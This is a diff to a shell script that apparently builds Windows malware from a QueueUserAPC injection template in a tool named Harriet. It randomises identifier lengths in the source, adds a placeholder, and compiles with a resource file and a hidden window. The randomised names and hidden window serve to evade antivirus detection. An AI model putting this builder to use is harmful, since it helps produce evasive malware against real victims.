@@ -72,20 +72,25 @@ cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > shell.txt
 Random5=$(cat shell.txt)
 sed -i "s/Random5/$Random5/g" Harriet/QueueUserAPC/Resources/template.cpp
 
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-6} | head -n 1 > shell.txt
 Random6=$(cat shell.txt)
 sed -i "s/Random6/$Random6/g" Harriet/QueueUserAPC/Resources/template.cpp
 
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
 Random7=$(cat shell.txt)
 sed -i "s/Random7/$Random7/g" Harriet/QueueUserAPC/Resources/template.cpp
 
-cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-5} | head -n 1 > shell.txt
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
 Random8=$(cat shell.txt)
 sed -i "s/Random8/$Random8/g" Harriet/QueueUserAPC/Resources/template.cpp
+
+cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-7} | head -n 1 > shell.txt
+RandomC=$(cat shell.txt)
+sed -i "s/RandomC/$RandomC/g" Harriet/QueueUserAPC/Resources/template.cpp
+
 rm shell*
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/QueueUserAPC/Resources/template.cpp -fpermissive -Wno-narrowing -O2 -lntdll >/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/QueueUserAPC/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -O2 -Os >/dev/null 2>&1
 echo ""
 sleep 2
 echo -e ${yellow}"***Malware Compiled***"${clear}
